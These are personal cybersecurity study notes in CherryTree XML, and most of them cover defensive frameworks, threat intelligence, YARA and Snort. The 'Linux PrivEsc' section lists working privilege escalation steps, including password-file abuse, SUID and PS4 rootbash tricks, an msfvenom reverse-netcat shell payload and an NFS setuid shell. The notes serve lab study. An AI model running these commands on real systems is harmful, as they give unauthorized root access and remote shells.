   → Crontab contents: cron are show here</rich_text>
      </node>
      <node name="Linux PrivEsc" unique_id="248" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1707255940" ts_lastsave="1707539902">
        <rich_text>Multiple types of Privileges Escalation
based in: </rich_text>
        <rich_text link="webs https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</rich_text>
        <rich_text>
connect with -oHostKeyAlgorithms=+ssh-rsa

Service exploits
- use of mysql to export, running like root
- use of UDF (user defined functions), </rich_text>
        <rich_text link="webs https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</rich_text>
        <rich_text>

Weak File Permissions - readable /etc/shadow
- contains user password hashes, only readable by root
- check permissions of /etc/shadow, and show content

Writable file permissions, /etc/shadow
- create password: mkpasswd -m sha-512 {pass}

Writable file permissions /etc/passwd
- information about user accounts
- readable by all world
- contains user passwords and some versions this saved here
- password hash: openssl passwd {password}

Abusing SUID/GUID files
- first step, check files with the SUID/GUID bit set.
- files to run with permission of owner/group, in this case like root
- SUID, set of permissions in linux, this is basic in user admin linux, the maximum number pf bits is 7, files with extra bit to owner
- SUID like: rws-rwx-rwx
- GUID like: rwx-rws-rwx
- finding SUID binaries: in manual form: find / -perm -u=s -type f 2&gt;/dev/null

Exploiting writeable /etc/passwd
- essential information required during login
- this is a plain text
- contains a list of system accounts with user ID, group ID, home directory, shell and more
- total of 7 fields

Escaping vi editor
- use of sudo -l, to list commands able as a super user, able to run certain commands as a root user without the root password
- GTFOBins is a curated list of unix binaries that can be exploited

Exploit crontab
- long-running process that executes commands at specific dates and times
- see commands: cat /etc/crontab
- msfvenom -p cmd/unix/reverse_netcat lhost={ip} lport={port} R

Exploting PATH variable
- an environmental variable in Linux and Unix-like OS which specifies directories that hold executable programs
- view: echo $PATH
- basic process like list processes with ps
- is possible rewrite the PATH variable to a location of our choosing

Sudo - shell escape sequences
- list programs with sudo permissions: sudo -l
- use of GTFPbins, using to elevate permissions

Sudo environment vaiables
- is possible configure certain environment variables
- to check variables: sudo -l
- LD_PRELOAD this load a shared object before any others when a program is run and LD_LIBRARY provides a list of directories where shared libraries are searched
- use of ldd to show libraries before to execute program
- execute libraries: sudo LD_LIBRARY_PATH=/tmp

Cron jobs, file permissions
- programs or scripts which users can schedule to run specific times or intervals
- is located in /etc/crontab
- </rich_text>
        <rich_text link="webs https://gtfobins.github.io/gtfobins/tar/">https://gtfobins.github.io/gtfobins/tar/</rich_text>
        <rich_text>

SUID / GUID executables
- find all SUID/GUID executables: find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null
- using SUID executable to shared object injection
- use of strace on the file and search output for open/access for no such file errors: strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE “open|access|no such file”
- using PATH environment variable and attempting to execute programs
- use of string to show all printable chars, get service to execute, for example “service apache2 start” and use of the path: PATH=.:$PATH /usr/local/bin/suid-env
- abusing shell features, in bash &lt;4.2-048 it is possible define shell functions with names that resemble file paths, create function in bash using : function {name} [code] and export -f {function name}
- in debug mode bash (&lt;4.4) use VarEnv PS4 to display an extra prompt, env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' {bash file}

Password and keys
- possible get password if is typed by issue in command line
- view content of history: cat ~/.*history | less
- config files contain passwords in plaintext
- backups with important files, show hidden files: ls -la

NFS
- files creates with NFS inherit the remote user's ID
- cat /etc/exports
- connect to root user in local machine
- create tmp file: mkdir /tmp/nfs
- mount to machine: mount -o rw,vers=3 {ip}:/tmp /tmp/nfs
- msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
- chmod +xs /tmp/nfs/shell.elf
- /tmp/shell.elf

Kernel exploits
- leave unstable state
- exploit suggester 2: perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
- the most common uis dirty cow

scripts: privesc-scripts</rich_text>
      </node>
      <node name="Vulnversity" unique_id="249" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1707540256" ts_lastsave="1707540265"/>
    </node>
    <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
      <rich_text>6 levels:
- Hash Values (Trivial)
   → use of numeric values in files:
      ⇒ MD5
      ⇒ SHA-1
      ⇒ SHA-2
   → modifying a file by even a single bit is trivial, with a simple bit the hash changes
- IP Addresses (Easy)
   → In attack before of find the IP of machine is possible block, drop or deny inbound
   → In this comments about Fast Flux that is a technique used by botnets to hide phishing
      ⇒ this technique consist in use comprimised hosts acting as proxies
- Domain Names (Simple)
   → In this is used with buy, register and modify DNS
   → Is possible the easier change using API of provider
   → In this is possible use the tecnique Punycode this use Unicode ASCII encoding to hide the URL
   → In shortnes a good practice is use + to check the redict
- Network / Host Artifacts (annoying)
   → Host
      ⇒ In this the attacker feels annoyed and frustrated, possible change the attack tools and methodologies
      ⇒ in this checks the traces or observables that attacker leave on the system, such as registry values, suspicious process execution, attack patterns or IOCs (indicators of compromise, files dropped by malicious applications, or anything exclusive to the current threat
   → Network
      ⇒ In this is used the user-agent, C2 information or URI patters followed by HTTP POST requests
      ⇒ is possible use tshark to check this headers
- Tools (Challenging)
   → Antivirus signatures, detection rules, and YARA rules can be great weapons for you to use against attackers at this stage.
   → is possible that attacker create malicious macro documents, any .EXE and .DDL files
   → Fuzzy Hashing is also a strong weapon against the attacker's tools
   → use of SSDeep
- TTPS (Tough)
   → stand for tactics, techniques and procedures
   → if you response to the TTPs quickly, you leave the adversaries almost no chence to fight back</rich_text>
    </node>
    <node name="Cyber kill Chain" unique_id="151" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685940622" ts_lastsave="1685948135">
      <rich_text>Military conceptrelated to the structure of an attack
consist of target identificacion, decision and order to attack the target and finally the target destruction 


Reconnaissance
- discovering and collecting information on the system and the victim
- email harvesting, process to obtain email from public, paid or free services, this create phishing attack

Weaponization
- this is combination of tools like malware and exploit into deliverable payload
- malware is a program or software that is designed, disrupt or gain unauthorized access to computer
- explort is a program or a code that takes advantage of the vulnerability of flaw in the app or system
- payload is a molicous code that attackers run on the system
- is possible that attacker buys the malicious software, or create

Delivery
- in this moment is decides the method for transmiting the payload or the malware
   → phishing email:
      ⇒ specific person by email
      ⇒ the email contains payload or malware
   → distributing uinfected USB drives in public places
      ⇒ use USB like a gift
   → Watering hole attack
      ⇒ this is using a redirect them to the malicious website of an attacker's choice
      ⇒ the attacker know vulnerability for the website and try to exploit it

Exploitation
- to gain access is necesary access to the system, is necessary exploiit the vulnerability
- in this moment is when escalate the privileges or move laterally
- lateral movement refers to the techniques that a malocious actori uses after gaining initial access
- is possible apply a Zero-day exploit

Installation
- exists an access point or backdoor 
- if is patched the software is lost the connection, the attacker needs install a persistent backdoor
- is possible use:
   → web shell on the webserver, is a script to mainten access to the compromised system, this is difficult to detect
   → installing a backdoor on the victim's machine, like meterpreter
   → creating or modifying windows services. know as T1543.003
   → adding the entry to the “run keys” for the malicious payload in the registry or the startup folder

Command and control
- C2 is channel through the malware to remotely control and manipulate the victim, this is know as C&amp;C or C2 Beaconing
- before to estableshing the connection, tha attacker has full contorl of the victim's machine
- the most common used is:
   → the protocol on the port 80 and 443
   → DNS, makes constant DNS requests to the DNS server that the belongs to an attacker, DNS tunneling

Actions on objectives (exfiltration)
- collect the credentials from users
- perform privilege escalation
- internal reconnaissance
- lateral movement through the company's environment
- collect and exfiltrate sensitive data
- deleting the backups and shadow copies
- overwrite or corrupt data</rich_text>
    </node>
    <node name="Unified kill chain" unique_id="155" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686034016" ts_lastsave="1686269870">
      <rich_text>this is a framework to understand how cyber attacs occur
this framework is used to complement anothers

used to explain the vairous stages of an attack, used to describe the methodology/path attackers such as hackers or APTs

Threat Modelling
- serie of steps to ultimate improve the security of a system, identify risk and essentially boils down to:
   → identify that system and apps need to be secureand what function they serve in the environment, critical or sensitive information
   → check vulnerabilities and weakness may have and how they could be potentially exploited
   → Creating a plan of action
   → Putting policies to prevent theses vulnerabilities
- this is important to reduce risk within a system or ap
- another frameworks: STRIDE, DREAD and CVSS

Introduction the inified kill chain
- published in 2017
- used to complement another frameowrks
- has 18 states to an attack
   → reconnaissance
   → weaponization
   → delivery
   → social engineering
   → exploitation
   → persistence
   → defese evasion
   → command &amp; control
   → pivoting
   → discovery
   → privilege escalation
   → execution
   → credential access
   → lateral movement
   → collection
   → exfiltration
   → impact
   → objective

Phase: In (initial foothold)
- the main focus is the access to system or network
- investigate vulnerabilities of the system that can be exploited to gain foothold
- reconnaissance, MITRE Tactic TA0043
   → techniques that an adversary employs to gather information
   → exists passive an active
   → discover what systems and services running on the target
   → finding contact lists of employees, social engineering or phishing attack
   → looking for potencial credentials
   → understanding the network topology and other networked systems
- Weaponization MITRE Tactic TA0001
   → set up the necessary infrastructure to perform the attack, what tools use
- Social Engineering, MITRE Tactic TA0001
   → manipulation of employees:
      ⇒ getting user to open a malicious attachment
      ⇒ Impersonating a web page and having the user enter their credentials
      ⇒ calling or visiting the target and impersonating a user, access of a site
- exploitation MITRE Tactic TA0002
   → takes advantage of weakness or vulnerabilities
      ⇒ uploading and executing a reverse shell
      ⇒ interfering with an automated script
      ⇒ abusing a web application vulnerability
- Persistence
   → mantain access to the system
      ⇒ creating a service on the target system
      ⇒ adding the target system to a command &amp; control
      ⇒ Leaving other forms of backdoors
- Defence Evasion, MITRE Tactic TA0005
   → understand defensive techniques used in the system:
      ⇒ web apps firewalls
      ⇒ network firewalls
      ⇒ anti-virus
      ⇒ intrusion detection systems
- Command &amp; control, MITRE Tactic TA0011
   → combines the efforts an adversaty made during the weaponization to estabish communications
      ⇒ execute commands
      ⇒ steal data, credentials and other information
      ⇒ use the controlled server to pivot to other systems
- Pivoting, MITRE Tactic TA0008
   → reach other systems within a network

Phase: Through (network propagation)
- successful foothold being establishing on the target.
- gain additional access and privileges to system and data to fulfil their goals
- generally in internal network
- Pivoting, MITRE Tactic TA0008
   → in this point is necesary a tunnel between command operations and the victim's network
   → use of malware and backdoors
- Discovery, MITRE Tactic TA0007
   → in this recolect data about of system and networks
- Privilege Escalation, MITRE Tactic TA0004
   → try gain more permissions within pivot system
      ⇒ system/root
      ⇒ local admin
      ⇒ user ith admin-like access
      ⇒ account with specific access or functions
- Execution, MITRE Tactic TA0002
   → connection between command operations and the victim
   → in this moment is distribution for all malware and backdoors
- Credential Access, MITRE Tactic TA0006
   → working with privilege escalation, get names and passwords using multiple methods
- Lateral Movement, MITRE Tactic TA0008
   → moving between network and get other targeted systems

Phase: Out (action on objectives)
- in this moment the CIA is affected, exists critical asset access
- Collection, MITRE Tactic TA0009
   → get valuable data of interest
   → main target sources include drives, browsers, audio, video and emial
- Exfiltration, MITRE Tactic TA0010
   → used of encryption measures and compression to avoid any detection
- Impact, MITRE Tactic TA0040
   → in this moment the data is comprimised
   → remove accounts
   → disk wipes
   → and data encryption such as ransomware, defacement and DoS attack
- objectives
   → depending the attacker get differents objectives, money, release private and confidential information</rich_text>
    </node>
    <node name="Diamond Model" unique_id="157" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686332462" ts_lastsave="1686794773">
      <rich_text>Created by cibersecurity professionals in 2013
four core features:
- adversary
- infrastructure
- capability
- victim
axes:
- social
- political
- technology

help identify the elements of an intrusion
analyze an Advanced Persistent threat

Adversary
- named attacker, enemy, cyber threat actor or hacker
- is an actor or organization responsible for utilizing a capability against the civtim to achieve their intent
- is difficult identify an adversary during the first stages
- adversary operator: hacker or person(s) conducting the instrusion activity
- adversary customer, entity that stands to benefit from the activity conducted in the intrusion

Victim
- target of adversary, organization, person, target email, IP, domain
- victim personae, people or organizations being targeted, organization names, people's names, industries, job roles, interests
- victim assets are the attack surface and include the set of systems, networks, email addresses, hosts, IP addresses, social networking accounts

Capability
- skills, tools and techniques used by the adversary, are TTPs
- included from less sophisticated methods, such as manual password guessing, to most sophisticated, like developing malware or a malicious tools
- capability capacity vulnerabilities and exposures is used
- adversary arsenal, set of capabilities, combinated capacities of adversary's capabilities

Infrastructure
- software or hardware, physical or logical interconnections that the adversary uses to deliver a capability or mantain control of capabilities
- is possible be IP addresses, domain names, email addresses or USB device
- Types:
   → 1; controlled or owned by the adversary
   → 2; controlled by intermediary, type of obfuscating the source and attribution of the activity, inclues malware staging server, malicious domain names, compromised email accounts
   → service providers are organizations that provide services considered critical for the adversary availabilityof tyep 1 an type 2, ISP, domain registrars and web mail providers

Event meta features
- six possible meta-features, is not required but they can add some value information
   → Timestamp
      ⇒ date and time of the event.
      ⇒ each event can be recorded
      ⇒ include start and stop event
      ⇒ is used to determine patterns and group
   → Phase
      ⇒ every malicious activity contains two or more phases which must be successfilly executed in succession to achieve the desired result", this is used with phases of Cyber kill chain
   → Result
      ⇒ they are helpful to capture
      ⇒ it is crucial to capture the results and post-conditions of an adversary, sometimes they might not always be known
      ⇒ the event can be labelled as, success, failure or unknown
   → Direction
      ⇒ describe host-based and network-based event and represents the direction of the intrusion attack
      ⇒ define seven values for this meta:
         • victim to infrastructure
         • infrastructure to victim
         • infrastructure to infrastructure
         • adversary to infrastructure
         • infrastructure to adversary
         • bidirectional
         • unknown
   → Methodology
      ⇒ will allow an analyst to describe the general classification of intrusion
   → Resources
      ⇒ needs one or more external resources to be satisfied to succed
      ⇒ example of use:
         • software
         • knowledge
         • information
         • hardware
         • funds
         • facilties
         • access

Social-political component
- the needs and intent of the adversary, money, gaining acceptance, hacktivism or espionage

Technology component
- relation between capability and infrastructure
- describes how the adversary operates and comunicates
- use of watering-hole, compromises legitimate websites</rich_text>
    </node>
    <node name="MITRE" unique_id="159" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686962698" ts_lastsave="1687306634">
      <rich_text>Is associated with CVEs (common vulnerability and exposures)
resource possible check when searching for an exploit for a given vulnerability
is used in many areas, outside of cybersecurity
includes artificial intelligence, health informatics, space security
solve problems for a safer world
APT is an acronym for advanced persistent threat
TTP -&gt; Tactics, Techniques and Procedures
- Tactics, adversary's goal or objective
- Techniques, how adversary achieves
- Procedures, how the technique is executed

Frameworks:
- ATT&amp;CK
   → globally-accessible knowledge base of adversary tactics and techniques based on real-world observation
   → 2013 record and document common TTPs
   → this was a internal project known as FMX (Fort Meade Experiment)
   → In this emulated adversarial TTPs
   → in begins is used with windows platform
   → tool for blue and red team
   → contains 14 categories
   → is used to map a threat group to their tactics and techniques
- CAR
   → Cyber analytics repository
   → is a knowledge base of analytics, this is based in ATT&amp;CK
   → defines a data model
   → pseudocode representation but with implementations (Splunk, EQL)
- ENGAGE
   → per the web site
   → framework for planning and discussing adeversary engagement operations
   → implementation of Cyber denial and cyber deception
   → cyber denial, prevent the adversary's ability their operation
   → cyber deception, intetionally plant artifacts to mislead the adversary
   → use of engage matrix, </rich_text>
      <rich_text link="webs https://engage.mitre.org/">https://engage.mitre.org/</rich_text>
      <rich_text>
   → categories:
      ⇒ prepare, set of operational actions that will lead to youir desired outcome
      ⇒ expose, adversaries when they trigger your deployed deception activities
      ⇒ affect, adversaries by performing actions that will have a negative impact on their operations
      ⇒ elicit, infomation by observing the adversary and learn more about their modus operandi (TTPs)
      ⇒ understand, the outcome of the operational actions (output)
- D3FEND
   → per the D3FEND website, a knowledge graph of cybersecurity countermeasures
   → is still in beta and funded by NSA
   → stands: Detection, Denial and Disruption Framework Empowering Network Defense
   → there are 408 artifacts in matrix
   → provides:
      ⇒ definition of technique
      ⇒ how it works
      ⇒ implements the technique (considerations)
      ⇒ how to utilize the technique (example)
- AEP
   → ATT&amp;CK Emulation plans
   → Adversary Emulation Library
   → CTID, center of Threat-informed defense
      ⇒ various companies and vendors
      ⇒ conduct research on cyber threats and their TTPs
   → some of companies:
      ⇒ AttackQI (founder)
      ⇒ Verizon
      ⇒ Microsoft (founder)
      ⇒ red canary (founder)
      ⇒ splunk
   → use of open source, methodologies and frameworks
   → is a public library making adversary emulation plans a free resource
   → used by blue and red teamers

Threat Intelligence or Cyber threat Intelligence
- </rich_text>
    </node>
    <node name="Intro to Cyber threat Intel" unique_id="160" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687379480" ts_lastsave="1687382339">
      <rich_text>Cyber Threat Intelligence
- evidence-based knowledge about adversaries, including:
   → indicators
   → tactics
   → motivations
   → actionable advice against them
- use of data, information and intelligence
   → data: discrete indicators associated with an adversary, IP, URL, hashes
   → information: combination of multiple data points, response of questions
   → Intelligence: correlation of data and information to extract patterns
- understand the relationship between your operational environment and your adversary, and how to defend
- different sources:
   → Internal
      ⇒ corporate security events such as vulnerability assessments and incident response reports
      ⇒ cyber awareness training reports
      ⇒ system logs and events
   → community
      ⇒ open web forums
      ⇒ dark web comminities for cybercriminals
   → external
      ⇒ threat intel feed
      ⇒ online marketplces
      ⇒ public sources
- threat intelligence classifications, understand the relationship between your operationa environment and your advesary, classifications:
   → Strategic Intel, high-level intel
   → Technical Intel, looks into evidence and artefacts of attack used by an adversary, baseline attack surface to analyze and develop defence mechanisms
   → Tactical Intel, can strengthen secuity controls and address vulnerabilities though real-time investigations
   → Operational Intel, looks into an adversary's specific motives and intent to perform an attack

CTI Lifecycle
- obtain from a data-churning process, transform from raw, contains 6 phases:
- Direction
   → objectives and goals defined
   → information assets and business that require defending
   → potential impact to be experienced on losing the assets or through process interruptions
   → sources of data and intel to be used towards protection
   → tools and resources that are arequired to defend the assets
- Collection
   → required data to address them
   → it is recommended to automate this phase to provide time for triaging incidents
- Analysis
   → must derive insights
   → investigating a potencional threat threat through uncovering indicators and attack patterns
   → Defining an action plan to avert an attack and defend the infra
   → strengthening security controls or justifying investment for additional reources
- Dissemination
   → use of different languages and formats
   → technical or financial
- Feedback
   → implments of security controls
   → regular interaction between teams to keep the lifecycl3 working

CTI Standards &amp; Frameworks
- MITRE ATT&amp;CK
- TAXII
   → the trusted automated exchange of indicator information
   → defines protocols for securely exchanging
   → supports two sharing models:
      ⇒ collection: collected and hosted bu a producer upon request by users using a request-response model
      ⇒ channel: pushed to users from a central server through a publish-subscibe model
- STIX
   → Structured trheat information expression
   → language developed for the: specification, capture, characterisation and communication of standardised CTI
- Cyber kill chain</rich_text>
    </node>
    <node name="Threat Intelligence Tools" unique_id="161" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687458672" ts_lastsave="1687633710">
      <rich_text>Threat Intelligence
- analysis of data and information using tools and techniques
- generate meaning patterns
- to mitigate:
   → who's attacking you?
   → what's their motivation?
   → what are their capabilities?
   → what artefacts and indicators of compromise should you look out for?
- classifications:
   → Strategic intel
   → technical intel
   → tactical intel
   → operational intel

UrlScan.io
- use to scanning and analysing websites
- get metadata about of the website
- Scan Results:
   → Summary, general information the URL, ranging IP address, domain, page history and a screenshot of the site
   → HTTP, information of HTTP connections made by the scanner to the site
   → Redirects, identifies redirects in the web-site
   → Links, show all the identified links outgoing from the site's homepage
   → Behaviour, details of the variables and cookies found on the site, indentify the frameworks used in developing the site
   → Indicators, Lists all IPs, domains and hashes associated with the site

Abuse.ch
- research project hosted by the institute of cybersecurity and engineering
- developed to identify and track malware and botnets
- these platforms are:
   → malware bazaar, sharing malware samples
   → feodo tracker, used to track botnet commands and control, infrastructure linked with emotet, dridex and trickbot
   → ssl blacklist, collecting and providing a blocklist of malicious SSL certificates and JA3/JA3s fingerprints
   → url haus, sharing malware distribution sites
   → threat fox, sharing indicatos of comprimise

PhishTool
- main of precursors of any cyber attack
- opening and accessing malicious files and links sent to them by email
- victims' infected with malware, harvesting their credentials and personal data
- objective is financial fraud
- two versions:
   → Community
   → Enterprise
- core functions:
   → Perform email analysis
      ⇒ retrieves metadata from phising emails
      ⇒ explanations and capabilities to follow the email's actions, attachments and URLs to triage the situation
   → Heuristic intelligence
      ⇒ OSINT in baked into the tool to provide analysts with the intelligence needed to stay ahead of persistent attacks and understand what TTPs were used to evade security controls and allow the adversary to social engineer a target
   → Classification and reporting
      ⇒ to take action quickly
      ⇒ reports can be generated to provide a forensic record that can be shared
- in enterprise version
   → manage user-reported phising events
   → report phising email findings back to users and keep them engaged in the process
   → email stack integration with microsoft 365 and google workspace
- in analysis tab
   → Headers: routing information email, source and destination, IP, DNS, Timestamp
   → Received Lines: track of SMTP servers for tracing purposes
   → X-headers: extension of headers, additional information
   → Security: Detail on emial, Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM) and Domain-based Message Authentication, Reporting and Conformance (DMARC)
   → Attachnments: files found in the email
   → Message URLs: Associated external URLs found in the email

Cisco Talos Intelligence
- this is a large team of security practicioners
- provide actionable intelligence, visibility on indicators and proteccion agains emerging threats
- six key teams:
   → Threat intelligence &amp; interdiction: quick correlation and tracking of threats
   → Detection Research: vulnerability and malware analysis, create rules and content
   → Engineering &amp; Development: provides the maintenance support
   → vulnerability research &amp; discovery: working with service and software vendors to develop repeatable means of identifying and reporting security vulnerabilities
   → Communities: maintains the image of the team and the open-source solutions
   → global outreach: disseminates intelligence to costumers and the security community through publications</rich_text>
    </node>
    <node name="Yara" unique_id="162" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687637289" ts_lastsave="1687749304">
      <rich_text>Yet Another Ridiculous Acronym

What is
- the pattern matching swiss knife form malware researchers
- use of rules to label patterns
- strings is fundamental to search the patterns

Yara rules
- use rules
- only effectives when understarnding of the patterns to search
- requires two arguments
   → the rule file
   → name of of file, directory or process ID to use the rule for
- every rule must have a name and condition
- .yar is standard file extension
- conditions in yara:
   → Desc
      ⇒ short of description
   → Meta
      ⇒ reserved for descriptive information
      ⇒ does not influence the rule itself
   → Strings
      ⇒ use of strings to search for specific text or hexadecimal in files or programs
      ⇒ the variables defined as $VAR
      ⇒ is necessary add condition to search
      ⇒ with multiple values use in condition: any of them
   → Conditions
      ⇒ in this is possible use relational operators to match or use any of then to use all or true to check if file exists
   → Weight

Yara Modules
- Cuckoo sandbox or python's PE module allow improve the technicality of yara rules
- Cuckoo is an automated malware analysis environment
- Python PE: allow crete Yara rules from the various sections and elements of the windows portable executable structure

Other tools and Yara
- exists multiple github resoureces and open-source tools to be utilized
- LOKI
   → free open-source IOS (Indicator of Compromise)
   → based in 4 methods:
      ⇒ File name ioc check
      ⇒ yara rule check
      ⇒ hash check
      ⇒ c2 back connect check
   → is possible use in win and linux
- THOR
   → multi-platform IOC and YARA scanner
   → exists precompiled versions for windows, linux and macos
- FENRIR
   → is a bash script; it will run on any system capable of running bash
- YAYA (Yet another Yara Automation)
   → is a new open source tool to help researchers manage multiple YARA rule repositories. YAYA starts by importing a set of high-quality YARA rules and then lets reserchers add their own rules, disable specific rulesets, and run scans of files

Using loki and its Yara rule set
- Loki contains some rules created to use
- Is possible add own rules based in my forensics reports

Creating Yara rules with yarGen
- used to create own rules
- this is a generator for YARA rules

Valhalla
- online yara feed created and hosted</rich_text>
    </node>
    <node name="OpenCTI" unique_id="163" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687811604" ts_lastsave="1687999015">
      <rich_text>open-source threat intelligence platform

Data model
- uses a variety of knowledge schemas in structuring data
- STIX us a serialised and standardised language format
- implemented as entities and relationships
- highlight services:
   → GraphQL API: to connect clients to the database and the messaging system
   → Write workers: write queries asynchronously from RabbitMQ, use python
   → Connectors: set of Python processes used to ingest, enrich or export data on the platform
</rich_text>
    </node>
    <node name="MISP" unique_id="165" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687886078" ts_lastsave="1687886640">
      <rich_text>Malware Information Sharing Platform

What is?
- an open source threat information platform that facilities the collection, storage and distribution of threat IOCs
- distributed model, with supported closed, semi-private and open communities
- uses:
   → Malware reverse engineering
   → security investigations
   → intelligence analysis
   → law enforcement
   → risk analysis
   → fraud analysis
- support:
   → IOC database, technical and non-technical information
   → automatic correlation
   → data sharing
   → import and export features
   → event graph
   → API support
- common terms:
   → event
   → attributes
   → objects
   → object references
   → sightings
   → tags
   → taxonomies
   → galaxies
   → indicators</rich_text>
    </node>
    <node name="Traffic Analysis Essencials" unique_id="166" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688053049" ts_lastsave="1688063745">
      <rich_text>Network security and Network Data
- use of authentication and authorisation
- three base control levels:
   → physical, prevent unauthorised physical access to networking devices
   → technical, data security controls, use of tunnels and security layers
   → administrative, creation of policies, access level and authentication processes
- access control, controls to ensure authenticacion and authorisation
- threat control, detecting and preventing anomalous/malicious activities
- managed security services:
   → Network penetration testing, simulation of external and internal attacker
   → vulnerability assesment, discovering and analysing vulnerabilities in the environment
   → incident response, set of actions to identify, contain and eliminate incidents
   → behavioural analysis, use of specific patterns to detect anomalies, threats, vulnerabilities and attacks

Traffic Analysis
- method to intercepting, recording/monitoring and analysing network data and communication
- detect and response to system health issues, network anomalies and threats
- use of two techniques:
   → flow analysis, collect data from networking devices, easy but not inlcude root of cause of a case
   → packet analysis, collect all available network data, provide full packet details, requires time and skillset to analyse</rich_text>
    </node>
    <node name="Snort" unique_id="167" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688145986" ts_lastsave="1690330125">
      <rich_text>Open source, rule-based network intrusion detection and prevention system (NIDS/NIPS)

Introduction to IDS/IPS
- Intrusion detection system
   → passive monitoring
   → two types of IDS:
      ⇒ Network intrusion detection system, monitors the traffic flow from various areas of network, investigate the traffic on the entire subnet
      ⇒ Host-based intrusion detection system, monitors the traffic flow from a single endpoint
- Intrusion prevention system
   → active protecting solution
   → responsible for stopping/preventing/terminating the suspicous event
   → exists 4 main types of IPS systems:
      ⇒ Network intrusion prevention system, monitors the traffic flow from various areas of the network
      ⇒ Behavious-based intrusion prevention system, monitor the traffic flow from various areas of the network, this required time of training ("baselining")
      ⇒ wireless intrusion prevention system, monitors the traffic from of wireless network
      ⇒ host-based intrusion prevention system, wireless from a single endpoint
- Techniques:
   → signature-based, relies on rules that identify the specific patterns, use to known threats
   → behaviour-based, new threats and new patterns, models compare the known/normal with unknown/abnormal behaviours
   → Policy-based, detected activities with system configuration and security policies
- snort has three primary uses: as a packet sniffer like tcpdump, packet logger - for network traffic debugging, full-blown network intrusion prevention system.
- snort is a NIDS and NIPS
- capabilities:
   → live traffic analysis
   → attack and probe detection
   → packet logging
   → protocol analysis
   → real-time alerting
   → modules &amp; plugins
   → pre-processors
   → cross-platform support

Use snort
- sudo snort -c /etc/snort/snort.conf -T -&gt; testing configuration
- snort -V -&gt; show version
- rules:
   → action: Alert | Drop | Reject | Log
   → Protocol: TCP | UDP | ICMP
   → Source IP
   → Source Port
   → Direction: &lt;&gt; | -&gt;
   → Destination IP
   → Destination Port
   → Options: (msg;flags;References;Sid;Rev)
- possible filter using flags:
   → F - FIN
   → S - SYN
   → R - RST
   → P - PSH
   → A - ACK
   → U - URG
- or using dsize: dsize:min&lt;&gt;max
- using in references the sameip is to check if is same ip source and destination

####
Challenge
- commands:
   → snort -c local.rules -A full -l . -r mx-3.pcap
   → snort -r {logfile}
   → snort -r {logfile} -n {port}
   → snort -r {logfile} -X -n {port} | to show more information, get name of FTP
   → in rules use of content: “{string to search}” to search strings
   → mode sniffer: sudo snort -v -l . &amp;&amp; sudo snort -r {logs} -X</rich_text>
    </node>
    <node name="network minner" unique_id="170" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690415989" ts_lastsave="1690416445">
      <rich_text>Open source traffic snipper, pcap handler and protocol analyzer
Network Forensic Analysis Tool for windows
is used as a passive network sniffer/packet capturing tool to detect OS, sessions, hostnames, open ports, without putting any traffic on the network
release 2007
answer the 5W:
- who (source IP and port)
- what (data/payload)
- where (destination IP and port)
- when (time and data)
- why (how/what happend)</rich_text>
    </node>
    <node name="Endpoint Security" unique_id="177" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695053526" ts_lastsave="1695056259">
      <rich_text>Topics:
- endpoint security fundamentals
- endpoint logging and monitoring
- endpoint log analysis

Security fundamentals:
- Core windows process, is necesary learn how to works windows
- knowledges about core windows processes
- manage of task manager
- sysinternals, is a compilation of over 70+ tools
- the most important is: TCPView and process explorer
- TCPView, this shows detailed listing all TCP and UDP endpoints in the system
- Process Explorer, shows a list of the currently active processes, including names and owner

Logging and monitoring
- windows event logs, are not a text files that can viewed using a text editor
- three ways:
   → Event viewer, GUI
   → Wevutil.exe, command line
   → Get-WinEvent, PowerShell cmdlet
- sysmon, used to monitor and log events on windows, detail and granular control
- OSQuery, open-source tool, query using SQL syntax, can be installed on various platforms: win, linux, macos and freebsd
- only used inside of machine
